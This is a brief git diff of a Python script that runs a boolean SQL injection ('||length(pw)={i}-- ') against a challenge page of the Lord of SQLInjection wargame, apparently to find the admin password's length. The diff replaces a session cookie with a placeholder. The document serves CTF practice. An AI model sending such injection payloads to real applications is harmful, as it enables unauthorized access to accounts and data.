@@ -1,7 +1,7 @@
 import requests as req 
 
 url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
-ck={"PHPSESSID":"849ve51c014kir7maol24mfnf8"}
+ck={"PHPSESSID":"냠냠"}
 
 for i in range(100):
 	params = {"pw":f"'||length(pw)={i}-- "}
@@ -12,3 +12,7 @@ for i in range(100):
 			print("Hello guest",i)
 			break
 			# admin의 pw가 더 긴걸 확인해서 break사용 
+
+			
+			
+			
